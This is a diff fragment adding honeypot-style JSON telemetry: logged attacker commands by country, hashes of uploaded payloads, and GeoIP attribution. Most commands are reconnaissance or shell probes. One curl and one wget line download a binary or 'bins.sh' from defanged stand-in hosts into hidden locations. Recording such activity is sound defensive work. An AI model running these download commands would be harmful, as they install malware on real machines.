+   "t": "2026-10-25T20:34:00Z",
+   "cmd": "nproc",
+   "country": "KR"
+  },
+  {
+   "t": "2026-10-25T20:34:00Z",
+   "cmd": "cat /proc/cpuinfo | grep name | wc -l",
+   "country": "KR"
+  },
+  {
+   "t": "2026-10-25T20:34:00Z",
+   "cmd": "uname -a",
+   "country": "KR"
+  },
+  {
+   "t": "2026-10-25T19:29:00Z",
+   "cmd": "cat /proc/mounts; /bin/busybox ECCHI",
+   "country": "US"
+  },
+  {
+   "t": "2026-10-25T19:29:00Z",
+   "cmd": "sh",
+   "country": "US"
+  },
+  {
+   "t": "2026-10-25T19:29:00Z",
+   "cmd": "shell",
+   "country": "US"
+  },
+  {
+   "t": "2026-10-25T19:29:00Z",
+   "cmd": "system",
+   "country": "US"
+  },
+  {
+   "t": "2026-10-25T19:29:00Z",
+   "cmd": "enable",
+   "country": "US"
+  },
+  {
+   "t": "2026-10-25T16:48:00Z",
+   "cmd": "curl -s hxxp://files[.]update-mirror[.]invalid/x86_64 -o /dev/shm/.k",
+   "country": "GB"
+  },
+  {
+   "t": "2026-10-25T15:25:00Z",
+   "cmd": "wget hxxp://192[.]0[.]2[.]x/bins.sh",
+   "country": "SA"
+  }
+ ],
+ "payloads": [
+  {
+   "sha256": "033ee81f78560985db52b57696d2b69e36fe3121cc07acf3f9a419517b6ac5b4",
+   "count": 21,
+   "via": [
+    "upload"
+   ],
+   "first_seen": "2026-10-12T08:57:10Z",
+   "last_seen": "2026-10-25T00:28:42Z"
+  },
+  {
+   "sha256": "ba4800788511ab1a520b843af07f780fed662515d88de28b433f1954921560d2",
+   "count": 19,
+   "via": [
+    "upload"
+   ],
+   "first_seen": "2026-10-12T08:59:17Z",
+   "last_seen": "2026-10-25T02:44:52Z"
+  },
+  {
+   "sha256": "2caddae616f18f01515182a2ac6c0cb808ad9bd41e763ed1809eb70bf30fc365",
+   "count": 19,
+   "via": [
+    "upload"
+   ],
+   "first_seen": "2026-10-13T04:10:47Z",
+   "last_seen": "2026-10-25T21:46:55Z"
+  }
+ ],
+ "attribution": {
+  "geoip": "IP geolocation by DB-IP (https://db-ip.com), CC BY 4.0",
+  "geoip_builds": {
+   "country": "2026-10-01",
+   "asn": "2026-10-01"
+  }
+ }
+}
